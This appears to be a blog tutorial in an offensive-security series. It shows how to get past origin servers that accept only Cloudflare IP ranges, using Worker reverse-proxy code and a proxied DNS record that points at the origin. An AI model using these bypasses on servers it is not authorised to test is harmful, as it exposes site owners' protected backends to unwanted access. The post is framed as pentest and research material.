#cloudflare #research #ip

[[research]]

Welcome to the **“RIP Cloudflare”** series, where we poke holes in Cloudflare’s shiny armor and dig up the origin IPs it’s hiding like buried treasure. Businesses and devs love to slap Cloudflare on their sites like it’s a “Keep Out” sign, forgetting that their backend might still be held together with duct tape. In this series, I’ll show you how to sneak past Cloudflare’s bouncers and crash the origin server’s party. Let’s see what’s really going on behind the curtain!

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*2KnEkcbFppCu2GK_x5nvNQ.png)

In this part, we’ll discuss a common scenario: you’ve discovered the origin IP address, but you’re met with a **403 Forbidden** error or find that the port is closed. This typically happens because the server is configured to only allow traffic from Cloudflare’s IP ranges, blocking all other connections. This restriction is often enforced using tools like **iptables**, **nginx configurations**, or **.htaccess** files.

For example, here’s a typical nginx configuration that restricts access to Cloudflare IPs only:

# /etc/nginx/conf.d/cloudflare-only.conf  
  
# Cloudflare IP ranges (IPv4 and IPv6)  
allow 173.245.48.0/20;  
allow 103.21.244.0/22;  
allow 103.22.200.0/22;  
allow 103.31.4.0/22;  
allow 141.101.64.0/18;  
allow 108.162.192.0/18;  
allow 190.93.240.0/20;  
allow 188.114.96.0/20;  
allow 197.234.240.0/22;  
allow 198.41.128.0/17;  
allow 162.158.0.0/15;  
allow 104.16.0.0/13;  
allow 104.24.0.0/14;  
allow 172.64.0.0/13;  
allow 131.0.72.0/22;  
allow 2400:cb00::/32;  
allow 2606:4700::/32;  
allow 2803:f800::/32;  
allow 2405:b500::/32;  
allow 2405:8100::/32;  
allow 2a06:98c0::/29;  
allow 2c0f:f248::/32;  
  
# Deny all other IPs  
deny all;

When faced with this restriction, there are a couple of methods to bypass it. Let’s explore two effective techniques.

### Method 1: Using Cloudflare Workers:

Cloudflare Workers is a serverless execution environment that allows you to run code on Cloudflare’s global network. Since Workers operate within Cloudflare’s infrastructure, they can be used to bypass IP whitelisting restrictions.

Here’s how you can use a Cloudflare Worker as a reverse proxy:

1. Go to the [Cloudflare Workers Playground](https://workers.cloudflare.com/playground).
2. Use the following code to create a reverse proxy:

export default {  
  async fetch(request, env, ctx) {  
    const targetUrl = "https://rip.cloudflare";  
  
    try {  
      // Clone the incoming request to forward it to the target URL  
      const forwardedRequest = new Request(targetUrl, {  
        method: request.method,  
        headers: new Headers([...request.headers].filter(([key]) => key.toLowerCase() !== "host")),  
        body: request.method !== "GET" && request.method !== "HEAD" ? request.body : null,  
      });  
  
      // Forward the request to the target server  
      const response = await fetch(forwardedRequest);  
  
      // Clone the response to return it to the client  
      const responseHeaders = new Headers(response.headers);  
      const responseBody = await response.text();  
  
      return new Response(responseBody, {  
        status: response.status,  
        headers: responseHeaders,  
      });  
    } catch (error) {  
      console.error("Error during reverse proxying:", error);  
      return new Response("Internal Server Error", { status: 500 });  
    }  
  },  
};

3. Click **Go** to execute the code.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*HS3ZmzamMNyiFu0aCjCMVA.png)

Bypassed :p

This Worker acts as a middleman, forwarding your requests through Cloudflare’s network, effectively bypassing the IP whitelisting restrictions.

### Method 2: Adding a DNS Record in Cloudflare Dashboard

Another straightforward method is to add a new DNS record in your Cloudflare dashboard. Here’s how:

1. Log in to your Cloudflare dashboard.
2. Add a new **A record** with the origin IP address.
3. Enable the **Proxy** option (orange cloud icon).
4. Save the changes.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*DIfLS7GMdjx6PG0nh6wAxQ.png)

Once the DNS record is active, you can access the origin server through the new domain, effectively bypassing the IP whitelisting.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*U3eaWQiVMc4eEDBz4V59nA.png)

Bypassed :p

While Cloudflare provides robust security features, it’s not foolproof. By leveraging tools like Cloudflare Workers or manipulating DNS settings, you can bypass IP whitelisting restrictions and access the origin server. However, it’s important to note that these techniques should only be used for ethical purposes, such as penetration testing or security research.

Stay tuned for the next part in the “RIP Cloudflare” series, where we’ll explore more advanced techniques to uncover and bypass Cloudflare’s defenses.

**Happy Hacking!**